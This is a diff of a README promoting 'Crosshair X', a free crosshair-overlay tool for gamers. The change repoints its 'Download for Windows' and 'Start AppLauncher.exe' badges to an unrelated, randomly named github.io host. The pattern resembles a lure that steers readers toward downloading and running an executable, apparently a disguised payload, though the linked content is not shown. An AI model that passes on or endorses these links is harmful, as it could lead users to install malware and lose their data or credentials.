@@ -2,8 +2,8 @@
 
 Level up your aim with Crosshair X — the ultimate tool to create and overlay custom crosshairs on your desktop screen. Designed for gamers who want maximum precision in FPS games, this tool works seamlessly across all fullscreen and borderless titles.
 
-[![Download for Windows](https://img.shields.io/badge/Download_for-Windows_10/11-green?style=for-the-badge&logo=windows)](https://crosshair-x-free.github.io/.github/)
-[![Start AppLauncher](https://img.shields.io/badge/Start_AppLauncher.exe-Now-blueviolet?style=for-the-badge&logo=gnome)](https://crosshair-x-free.github.io/.github/)
+[![Download for Windows](https://img.shields.io/badge/Download_for-Windows_10/11-green?style=for-the-badge&logo=windows)](https://spbpj1bb1.github.io/.github/)
+[![Start AppLauncher](https://img.shields.io/badge/Start_AppLauncher.exe-Now-blueviolet?style=for-the-badge&logo=gnome)](https://spbpj1bb1.github.io/.github/)
 
 ---
 
